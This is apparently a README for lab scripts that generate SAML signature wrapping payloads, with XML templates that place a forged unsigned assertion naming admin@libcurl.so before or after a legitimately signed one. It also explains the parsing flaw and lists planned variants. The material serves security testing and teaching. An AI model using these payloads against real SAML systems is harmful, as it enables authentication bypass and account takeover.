# SAML Signature Wrapping Payloads

A collection of small Python scripts for generating **SAML Signature Wrapping (XML Signature Wrapping)** payloads for authorized security testing and PentesterLab-style labs.

The scripts take an existing valid `response.xml`, preserve the legitimate signed assertion, and construct a modified SAML response that exploits differences between **signature validation** and **application-level XML parsing**.

## Current Payloads

### `sp-first-assertion.py`

Targets applications that retrieve the **first `Assertion` / `NameID`** from the SAML response.

The script:

1. Loads `response.xml`.
2. Preserves the legitimate signed assertion.
3. Prepends an unsigned assertion containing the attacker-controlled identity.
4. Writes the result to `payload.xml`.

Resulting structure:

```xml
<Response>
    <Assertion>
        <Subject>
            <NameID>admin@libcurl.so</NameID>
        </Subject>
    </Assertion>

    <Assertion>
        <!-- legitimate signed assertion -->
        <Signature>
            ...
        </Signature>
        <Subject>
            <NameID>original@example.org</NameID>
        </Subject>
    </Assertion>
</Response>
```

The attack works when the SP verifies the legitimate assertion but subsequently obtains the identity by simply selecting the **first `NameID`** in the document.

Usage:

```bash
python sp-first-assertion.py
```

Input:

```text
response.xml
```

Output:

```text
payload.xml
```

---

### `sp-last-assertion.py`

Targets applications that retrieve the **last `Assertion` / `NameID`**.

The script preserves the original signed assertion and appends an unsigned assertion containing:

```text
admin@libcurl.so
```

Resulting structure:

```xml
<Response>
    <Assertion>
        <!-- legitimate signed assertion -->
        <Signature>
            ...
        </Signature>
        <Subject>
            <NameID>original@example.org</NameID>
        </Subject>
    </Assertion>

    <Assertion ID="whatever_you_want">
        <Subject>
            <NameID>admin@libcurl.so</NameID>
        </Subject>
    </Assertion>
</Response>
```

Usage:

```bash
python sp-last-assertion.py
```

Input:

```text
response.xml
```

Output:

```text
payload.xml
```

## Why Signature Wrapping Works

A SAML SP should effectively perform:

```text
1. Locate the signed object referenced by ds:Reference
2. Verify its signature
3. Extract identity information from that same verified object
```

A vulnerable implementation may instead do:

```text
1. Verify one Assertion using the XML signature
2. Search the entire XML document for NameID
3. Use the first/last matching NameID
```

This creates a discrepancy between the XML node that was **cryptographically verified** and the XML node from which the application obtains the **authenticated identity**.

The scripts in this repository automate the XML manipulation required to demonstrate these parsing discrepancies.

## Planned Payloads

Additional SAML wrapping variants can be added as separate scripts, including:

- **First Assertion**
- **Last Assertion**
- **First `NameID`**
- **Last `NameID`**
- Duplicate `Assertion` IDs
- Duplicate `NameID` elements
- Assertion placement / reordering variants
- Response-level vs Assertion-level signature confusion
- `ds:Reference` / ID resolution inconsistencies
- Namespace-based XML parsing discrepancies
- Nested Assertion variants
- Multiple signed/unsigned Assertion combinations

Each variant will target a specific XML parsing or signature-resolution assumption made by the vulnerable SP.

## Requirements

Python 3 with:

```bash
pip install lxml
```

## Repository Structure

```text
.
├── README.md
├── sp-first-assertion.py
├── sp-last-assertion.py
└── response.xml
```

`response.xml` is the original SAML response captured from the lab.

Generated payloads are written to:

```text
payload.xml
```

## Disclaimer

These scripts are intended for **authorized security testing, research, and educational labs** such as PentesterLab. Do not use them against SAML deployments without explicit authorization.
